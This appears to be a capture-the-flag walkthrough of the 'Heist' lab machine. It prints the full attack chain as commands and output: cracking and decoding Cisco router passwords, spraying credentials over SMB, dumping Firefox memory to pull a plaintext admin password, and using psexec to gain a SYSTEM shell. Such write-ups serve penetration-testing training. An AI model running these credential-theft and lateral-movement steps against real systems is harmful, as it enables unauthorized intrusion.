# heist 

## Enumeration

Start with a basic nmap scan:
```s
$ sudo nmap -p- -A nmap/heist_all.nmap 10.10.10.149 -Pn
# Nmap 7.93 scan initiated Sat Apr  1 11:47:02 2023 as: nmap -p- -A -oN nmap/heist_all.nmap -Pn 10.10.10.149
Nmap scan report for 10.10.10.149
Host is up (0.049s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Support Login Page
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-01T15:50:13
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   57.26 ms 10.10.14.1
2   57.64 ms 10.10.10.149

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr  1 11:50:49 2023 -- 1 IP address (1 host up) scanned in 227.58 seconds

```

### tcp/80
Grabbing the HTTP header of the root page:

```s
$ curl -I "http://10.10.10.149"
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 0
Content-Type: text/html; charset=UTF-8
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: login.php
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.1
Set-Cookie: PHPSESSID=rtlgj1bq0ifhstjrdpck9smafr; path=/
Date: Sat, 01 Apr 2023 15:47:50 GMT
```

I also did a `whatweb`.

```s
$ whatweb "http://10.10.10.149" -a 3
http://10.10.10.149 [302 Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.149], Microsoft-IIS[10.0], PHP[7.3.1], RedirectLocation[login.php], X-Powered-By[PHP/7.3.1]
http://10.10.10.149/login.php [200 OK] Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.149], JQuery[3.1.1], Microsoft-IIS[10.0], PHP[7.3.1], PasswordField[login_password], Script, Title[Support Login Page], X-Powered-By[PHP/7.3.1]
```

Looks like an Microsoft-IIS 10.0 running PHP 7.3.1. Navigatin to the main page shows a login form. I attempt `admin@heist.com:admin` and a few other creds but nothing seems to work. There is a `login as guest` button which redirects you to a chat log between `Hazard` and a `Support Admin`.

The chat log reads:

```
Hazard: Hi, I've been experiencing problems with my cisco router. Here's a part of the configuration the previous admin had been using. I'm new to this and don't know how to fix it. :( 
Support Admin: Hi, thanks for posting the issue here. We provide fast support and help. Let me take a look and get back to you! 
Hazard: Thanks a lot. Also, please create an account for me on the windows server as I need to access the files. 
```

Viewing the attached log file:

```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```

Lets go through each of these commands one-by-one:
- `hostname ios-1` : This sets the hostname of the Cisco router
- `security passwords min-length 12` : Sets the minimum password length requirement for all users
- `enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91` : a configuration mode command that sets this Cisco device password that is required for any user to enter enable mode
- `username rout3r password 7 0242114B0E143F015F5D1E161713` : Creates a user `rout3r` with the password encryption `Cisco's type 7 encryption algorithm`
- `username admin privilege 15 password 7 02375012182C1A1D751618034F36415408` : Creates a user `admin` with privilege 15 and assigns a password with the same encryption scheme

The rest of the commands are router/switch configuration commands. Setting SSH authentication and version, updating settings for BGP, etc.

First, I attempt to crack the provided hash:

```s
$ john --wordlist=/usr/share/wordlists/rockyou.txt hazard.hash 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)     
1g 0:00:00:05 DONE (2023-04-01 12:06) 0.1808g/s 633981p/s 633981c/s 633981C/s stealthy001..stcroix85
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

I get the password `stealth1agent`.

Reading about Cisco encrytion algorithms, it appears that Cisco's type 7 encryption algorithm is deprecated and weak. Googling some online tools I find a [decrytor](https://www.ifm.net.nz/cookbooks/passwordcracker.html):

```
0242114B0E143F015F5D1E161713 -> rout3r:$uperP@ssword
02375012182C1A1D751618034F36415408 -> admin:Q4)sJu\Y8qz*A3?d
```

### tcp/445

Attempting to enumerate NULL shares:

```s
$ smbmap -u '' -p '' -H 10.10.10.149                   
[!] Authentication error on 10.10.10.149
```

Next I try the credentials `hazard:stealth1agent`

```s
$ smbmap -u 'hazard' -p 'stealth1agent' -H 10.10.10.149
[+] IP: 10.10.10.149:445        Name: 10.10.10.149                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

When connecting to `IPC$` and attempting enumeration, I was met with:

```s
$ smbclient \\\\10.10.10.149\\IPC$ -U "hazard"           
Password for [WORKGROUP\hazard]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
```

I use `enum4linux` to auto-enumerate everything for me:

```s
$ enum4linux -a -u 'hazard' -p 'stealth1agent' 10.10.10.149
...<snip>...
S-1-5-21-4254423774-1266059056-3197185112-500 SUPPORTDESK\Administrator (Local User)
S-1-5-21-4254423774-1266059056-3197185112-501 SUPPORTDESK\Guest (Local User)
S-1-5-21-4254423774-1266059056-3197185112-503 SUPPORTDESK\DefaultAccount (Local User)
S-1-5-21-4254423774-1266059056-3197185112-504 SUPPORTDESK\WDAGUtilityAccount (Local User)
S-1-5-21-4254423774-1266059056-3197185112-513 SUPPORTDESK\None (Domain Group)
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (Local User)
S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\support (Local User)
S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (Local User)
S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\Jason (Local User)
...<snip>...
```

With this list of usernames and with a list of passwords, I perform a password spray:

```s
$ crackmapexec smb 10.10.10.149 -u usersnames.txt -p passwords.txt --continue-on-success
...<snip>...
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d
...<snip>...
```

The credentials `Chase:Q4)sJu\Y8qz*A3?d` gives me foothold.

### tcp/5985

Attempting to authenticate using `evil-winrm` using `hazard:stealth1agent` fails

```s
$ evil-winrm -i 10.10.10.149 -u 'hazard' -p 'stealth1agent'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

## Foothold

With a list of usernames and passwords, I perform password spray

```s
$ crackmapexec smb 10.10.10.149 -u usersnames.txt -p passwords.txt --continue-on-success
...<snip>...
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d
...<snip>...
```

The credentials `Chase:Q4)sJu\Y8qz*A3?d` gives me foothold.

## Privilege Escalation

Checking the process information on the machine:

```powershell
get-process
...<snip>...
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    378      28    23416     307864       0.98    788   1 firefox
    401      34    35764      93292       1.91    912   1 firefox
   1083      72   156824     233780       8.34   2608   1 firefox
    347      19    10036      38488       0.06   5236   1 firefox
    356      25    16452      39204       0.08   6328   1 firefox
...<snip>...
```

Appears `support\chase` has Firefox sessions. This may mean they are currently accessing the webpage. Let's see if we can lift any credentials from their session?

First, dump the session using `procdump64.exe`

```powershell
PS C:\Users\Chase\Downloads> .\procdump64.exe -ma 748 firefox.dmp -accepteula

ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[22:07:37] Dump 1 initiated: C:\Users\Chase\Downloads\firefox.dmp
[22:07:37] Dump 1 writing: Estimated dump file size is 331 MB.
[22:07:38] Dump 1 complete: 331 MB written in 1.5 seconds
[22:07:39] Dump count reached.
```

Let's also view the HTTP packets being sent when you attempt to authenticate to the web application. I intercept using Burp:

```
POST /login.php HTTP/1.1
Host: 10.10.10.149
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Origin: http://10.10.10.149
Connection: close
Referer: http://10.10.10.149/login.php
Cookie: PHPSESSID=9lnml006el4poreg3csa3bh8qn
Upgrade-Insecure-Requests: 1

login_username=cerb%40email.com&login_password=superpassword&login=
```

Looks like `login_password` is the POST request field which contains the password. Let's try to `grep` for this field in `firefox.dmp`

```bash
$ strings firefox.dmp
"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
login_password=4dD!5}x/re8]FBuZ&login=
http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
O^privateBrowsingId=1,p,:http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
:http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
:http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

Looks like `chase` logs into the web application as `admin` with the credentials of `admin@support.htb:4dD!5}x/re8]FBuZ`.

Let try to authenticate as `Administrator` using these credentials:

```bash
$ impacket-psexec 'administrator:4dD!5}x/re8]FBuZ@10.10.10.149'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.149.....
[*] Found writable share ADMIN$
[*] Uploading file MIqDueAk.exe
[*] Opening SVCManager on 10.10.10.149.....
[*] Creating service ORlp on 10.10.10.149.....
[*] Starting service ORlp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.437]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```